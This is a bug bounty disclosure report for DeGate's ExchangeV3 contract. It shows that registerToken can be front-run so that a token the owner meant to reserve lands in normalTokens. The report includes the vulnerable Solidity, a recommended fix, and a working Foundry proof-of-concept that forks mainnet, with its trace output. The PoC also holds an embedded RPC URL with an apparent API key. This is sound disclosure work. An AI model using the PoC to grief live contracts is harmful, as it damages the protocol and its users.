# 25886 - \[SC - Insight] registerToken can be front-run causing token ca...

Submitted on Nov 20th 2023 at 22:35:43 UTC by @yttriumzz for [Boost | DeGate](https://immunefi.com/bounty/boosteddegatebugbounty/)

Report ID: #25886

Report type: Smart Contract

Report severity: Insight

Target: <https://etherscan.io/address/0x9C07A72177c5A05410cA338823e790876E79D73B#code>

Impacts:

* Griefing (e.g. no profit motive for an attacker, but damage to the users or the protocol)

## Description

```solidity
    function registerToken(
        ExchangeData.State storage S,
        address tokenAddress,
        bool isOwnerRegister
        )
        public
        returns (uint32 tokenID)
    {
        require(!S.isInWithdrawalMode(), "INVALID_MODE");
        require(S.tokenToTokenId[tokenAddress] == 0, "TOKEN_ALREADY_EXIST");

        if (isOwnerRegister) {
            require(S.reservedTokens.length < ExchangeData.MAX_NUM_RESERVED_TOKENS, "TOKEN_REGISTRY_FULL");
        } else {
            require(S.normalTokens.length < ExchangeData.MAX_NUM_NORMAL_TOKENS, "TOKEN_REGISTRY_FULL");
        }

        // Check if the deposit contract supports the new token
        if (S.depositContract != IDepositContract(0)) {
            require(S.depositContract.isTokenSupported(tokenAddress), "UNSUPPORTED_TOKEN");
        }

        // Assign a tokenID and store the token
        ExchangeData.Token memory token = ExchangeData.Token(tokenAddress);

        if (isOwnerRegister) {
            tokenID = uint32(S.reservedTokens.length);
            S.reservedTokens.push(token);
        } else {
            tokenID = uint32(S.normalTokens.length.add(ExchangeData.MAX_NUM_RESERVED_TOKENS));
            S.normalTokens.push(token);
        }
        S.tokenToTokenId[tokenAddress] = tokenID + 1;
        S.tokenIdToToken[tokenID] = tokenAddress;

        S.tokenIdToDepositBalance[tokenID] = 0;

        emit TokenRegistered(tokenAddress, tokenID);
    }
```

Everyone can call `registerToken` to register a token. If it is called by the owner, the token is added to `reservedTokens`, otherwise it is added to `normalTokens`. Once a token is added to `reservedTokens` or `normalTokens`, it cannot be added again.

Therefore, the attacker can add the token that the Owner expects to be added to `reservedTokens` to `normalTokens` first.

The attack process is as follows:

1. Owner call `registerToken` to register TokenA
2. The attacker observes that mempool recognizes the Owner's transaction, initiates a transaction with a higher gas price, and front-run executes `registerToken` to register TokenA.

## Impact

<https://docs.degate.com/v/product\\_en/concepts/economic-security>

Please refer to the above document for the difference between `reservedTokens` and `normalTokens`. The owner's inability to add tokens to `reservedTokens` may damage the stable run of the protocol.

## Risk Breakdown

Difficulty to Exploit: Easy

## Recommendation

Owner can convert `normalTokens` into `reservedTokens`, which can prevent this BUG. And it allows the Owner to have the ability to add `reservedTokens` in the future. (For example, if a Token becomes popular, consider upgrading it from `normalTokens` to `reservedTokens`).

## References

## Proof of concept

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

// main fork url
string constant MAINNET_RPC_URL = "https://eth-mainnet.g.alchemy.com/v2/TrnSBL14bW3BaXavojgbw69L0ZK2lbZ_";
uint256 constant MAINNET_BLOCK_NUMBER = 18614000;

// contract address
address constant ADDRESS_CONTRACT_ExchangeV3 = address(0x9C07A72177c5A05410cA338823e790876E79D73B);
address constant ADDRESS_CONTRACT_WETH = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

// user address
address constant ADDRESS_USER_ExchangeV3Owner = address(0x9b93e47b7F61ad1358Bd47Cd01206708E85AE5eD);
address constant ADDRESS_USER_Attacker = address(0xAACE);

interface IExchangeV3 {
    function registerToken(address tokenAddress) external returns (uint32);
}

contract YttriumzzDemo is Test {
    IExchangeV3 exchangeV3;

    function setUp() public {
        vm.selectFork(vm.createFork(MAINNET_RPC_URL, MAINNET_BLOCK_NUMBER));

        exchangeV3 = IExchangeV3(ADDRESS_CONTRACT_ExchangeV3);
    }

    function testYttriumzzDemo() public {
        // This POC assumes this scenario:
        //   The Owner wants to add WETH to the `reservedTokens` list and call the `registerToken` function.
        //   The Attacker checked that the mempool contained this transaction and frount-run call the `registerToken` function,
        //   causing WETH to be added to the `normalTokens` list.
        // 
        // In order to simplify the POC:
        //   The Attacker is executed first, instead of providing a high gas price to let the node execute in advance.
        //
        // Results:
        //   WETH is added to the `normalTokens` list, and the Owner's transaction execution fails.

        vm.startPrank(ADDRESS_USER_Attacker);
        uint32 tokenID = exchangeV3.registerToken(ADDRESS_CONTRACT_WETH);
        vm.stopPrank();

        vm.startPrank(ADDRESS_USER_ExchangeV3Owner);
        vm.expectRevert("TOKEN_ALREADY_EXIST");
        exchangeV3.registerToken(ADDRESS_CONTRACT_WETH);
        vm.stopPrank();

        assertTrue(tokenID > 32);
        console.log("tokenID: %s", tokenID);
    }
}
```

Output:

```shell
$ forge test --match-test testYttriumzzDemo -vvvv
[⠰] Compiling...
[⠑] Compiling 1 files with 0.8.19
[⠘] Solc 0.8.19 finished in 1.22s
Compiler run successful!

Running 1 test for test/YttriumzzDemo.sol:YttriumzzDemo
[PASS] testYttriumzzDemo() (gas: 138975)
Logs:
  tokenID: 60

Traces:
  [138975] YttriumzzDemo::testYttriumzzDemo()
    ├─ [0] VM::startPrank(0x000000000000000000000000000000000000AAce)
    │   └─ ← ()
    ├─ [102352] 0x9C07A72177c5A05410cA338823e790876E79D73B::registerToken(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    │   ├─ [97353] 0xc56C1dfE64D21A345E3A3C715FFcA1c6450b964b::registerToken(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    │   │   ├─ [89300] 0x2Bf7021a3Aa041e1a8a5082DB720d0202C70A3aE::5ac78334(0000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000000) [delegatecall]
    │   │   │   ├─ [5341] 0x54D7aE423Edb07282645e740C046B9373970a168::isTokenSupported(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   │   │   ├─ [321] 0x8CCc06C4C3B2b06616EeE1B62F558f5b9C08f973::isTokenSupported(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    │   │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   └─ ← 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ emit TokenRegistered(: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, : 60)
    │   │   │   └─ ← 0x000000000000000000000000000000000000000000000000000000000000003c
    │   │   └─ ← 0x000000000000000000000000000000000000000000000000000000000000003c
    │   └─ ← 0x000000000000000000000000000000000000000000000000000000000000003c
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] VM::startPrank(0x9b93e47b7F61ad1358Bd47Cd01206708E85AE5eD)
    │   └─ ← ()
    ├─ [0] VM::expectRevert(TOKEN_ALREADY_EXIST)
    │   └─ ← ()
    ├─ [22427] 0x9C07A72177c5A05410cA338823e790876E79D73B::registerToken(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    │   ├─ [21912] 0xc56C1dfE64D21A345E3A3C715FFcA1c6450b964b::registerToken(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [delegatecall]
    │   │   ├─ [842] 0x2Bf7021a3Aa041e1a8a5082DB720d0202C70A3aE::5ac78334(0000000000000000000000000000000000000000000000000000000000000003000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000001) [delegatecall]
    │   │   │   └─ ← 0x08c379a000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000013544f4b454e5f414c52454144595f455849535400000000000000000000000000
    │   │   └─ ← "TOKEN_ALREADY_EXIST"
    │   └─ ← "TOKEN_ALREADY_EXIST"
    ├─ [0] VM::stopPrank()
    │   └─ ← ()
    ├─ [0] console::9710a9d0(0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000000003c000000000000000000000000000000000000000000000000000000000000000b746f6b656e49443a202573000000000000000000000000000000000000000000) [staticcall]
    │   └─ ← ()
    └─ ← ()

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.22s

Ran 1 test suites: 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
